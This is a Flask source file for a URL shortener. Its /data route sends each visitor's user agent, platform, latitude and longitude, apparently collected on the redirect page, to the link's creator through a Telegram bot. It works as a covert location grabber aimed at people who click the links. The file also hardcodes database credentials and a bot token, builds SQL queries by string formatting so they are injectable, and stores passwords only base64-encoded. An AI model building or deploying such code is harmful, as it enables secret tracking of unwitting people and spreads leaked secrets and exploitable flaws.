from flask import Flask, render_template, request, url_for, jsonify, session, redirect, g, flash
import requests
import mysql.connector
import random
import base64

string = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"

mydb = mysql.connector.connect(
    host="cloud-de.jagonyassh.com",
    user="lmmqxzup",
    password="h5DeA(u95NE*a3",
    database="lmmqxzup_shorturl"
    )

mycursor = mydb.cursor()


app = Flask(__name__)
app.secret_key = "onechan-shortener-mad-with-luv"

@app.route('/', methods=['GET'])
def index(urlpendek=None):
    if g.user:    
        return render_template('index.html', user=session['user'], hasil=urlpendek)
    return render_template('auth.html')
    
@app.route('/send', methods=['GET', 'POST'])
def send():
    if request.method == "POST":
        last = ""
        user = session['user']
        for i in range(5):
            last += string[random.randint(0,len(string)-1)]
        url_asli = request.form['url']
        url_short = last
        sql = "INSERT INTO shortener (user, url_asli, url_short) VALUES (%s, %s, %s)"
        val = (user, url_asli, url_short)
        mycursor.execute(sql, val)
        mydb.commit()
        hasil = "https://onechan-shortener.herokuapp.com/"+url_short
        return index(urlpendek=hasil)
    return render_template('index.html')

@app.route('/<link>', methods=['GET', 'POST'])
def shortlink(link):
    sql = "SELECT * FROM shortener WHERE url_short LIKE '%"+link+"%'"
    mycursor.execute(sql)
    cek = mycursor.fetchall()
    if len(cek) > 0:
        link = cek[0][2]
        return direct(hasil=link)
    else:
        return redirect('404')
        
@app.route('/redirect/')
@app.route('/redirect/<hasil>', methods=['GET', 'POST'])
def direct(hasil=None):
    return render_template("redirect.html", hasil=hasil)
    
@app.route('/data', methods=['GET', 'POST'])
def data():
    where = request.get_json()
    hasil = where['URL']
    bagi = hasil.split('/')
    user_id = bagi[3]
    sql = "SELECT * FROM shortener WHERE url_short LIKE '%{}%'".format(user_id)
    mycursor.execute(sql)
    cek = mycursor.fetchall()
    if len(cek) > 0:
        user_name = cek[0][1]
        sql2 = "SELECT * FROM account WHERE username LIKE '%{}%'".format(user_name)
        mycursor.execute(sql2)
        cek2 = mycursor.fetchall()
        if len(cek2) > 0:
            user_id = cek2[0][1]
    api = '1737474106:AAH3nbDtdNd7R-gMtbPMQmKMI7tw8CTeNq4'
    where = request.get_json()
    data = '''
    <b>ONECHAN Notification!</b>
    
    <i>URL</i> :   {}
    <i>User-Agent</i>  :   {}
    <i>Platform</i>    :   {}
    <i>Latitude</i>    :   {}
    <i>Longtitude</i>  :   {}
    '''.format(where['URL'],where['UAgent'],where['Platform'],where['Lat'],where['Lon'])
    url = 'https://api.telegram.org/bot{}/sendMessage?chat_id={}&parse_mode=HTML&text={}'.format(api,user_id,data)
    res = requests.post(url)
    return jsonify(where)
    
@app.route('/auth', methods=['GET', 'POST'])
def auth():
    return render_template("auth.html")
    
@app.route('/login', methods=['POST'])
def login():
    session.pop('user', None)
    usernm = request.form['form-username']
    passwd = request.form['form-password']
    
    sql = "SELECT * FROM account WHERE username LIKE '%{}%'".format(usernm)
    mycursor.execute(sql)
    cek = mycursor.fetchall()
    if len(cek) > 0:
        pass_db = cek[0][3]
        base64_message = pass_db
        base64_bytes = base64_message.encode('ascii')
        message_bytes = base64.b64decode(base64_bytes)
        pass_db = message_bytes.decode('ascii')
        if pass_db == passwd:
            session['user'] = usernm
            return redirect(url_for('index'))
        else:
            flash("Username atau Password salah!")
            return redirect(url_for('auth'))
    else:
        flash("Username tidak ditemukan!")
        return redirect(url_for('auth'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == "POST":
        hasil = []
        tele = request.form['form-tele-username']
        url = "https://api.telegram.org/bot1737474106:AAH3nbDtdNd7R-gMtbPMQmKMI7tw8CTeNq4/getUpdates"
        res = requests.get(url).json()
        for i in range(len(res['result'])):
            if 'my_chat_member' in res['result'][i]:
                continue
            else:
                if tele == res['result'][i]['message']['from']['username']:
                    hasil.append(res['result'][i]['message']['from']['id'])
        if len(hasil) > 0:
            user_tele = hasil[0]
            usernm = request.form['form-username']
            sql_user = "SELECT * FROM account WHERE username LIKE '%{}%'".format(usernm)
            mycursor.execute(sql_user)
            cek_user = mycursor.fetchall()
            if len(cek_user) > 0:
                flash("Username sudah ada!")
                return redirect(url_for('auth'))
            else:
                passwd = request.form['form-password']
                message = passwd
                message_bytes = message.encode('ascii')
                base64_bytes = base64.b64encode(message_bytes)
                passwd = base64_bytes.decode('ascii')
                sql = "INSERT INTO account (user_tele, username, password) VALUES (%s, %s, %s)"
                val = (user_tele, usernm, passwd)
                mycursor.execute(sql, val)
                mydb.commit()
                api = '1737474106:AAH3nbDtdNd7R-gMtbPMQmKMI7tw8CTeNq4'
                data = '<b>Akun anda berhasil dibuat!</b>'
                url = 'https://api.telegram.org/bot{}/sendMessage?chat_id={}&parse_mode=HTML&text={}'.format(api,user_tele,data)
                res = requests.post(url)
                flash("Akun berhasil dibuat!")
                return redirect(url_for('auth'))
        else:
            flash("Telegram tidak ditemukan!")
            return redirect(url_for('auth'))
        
@app.before_request
def before_request():
    g.user = None
    if 'user' in session:
        g.user = session['user']
        
@app.route('/logout', methods=['GET'])
def logout():
    session.pop('user', None)
    return render_template("auth.html")
    
@app.route('/404')
def notfound():
    return render_template('404.html')

if '__name__' == '__main__':
    app.run(host='127.0.0.1', port='8080', debug=True)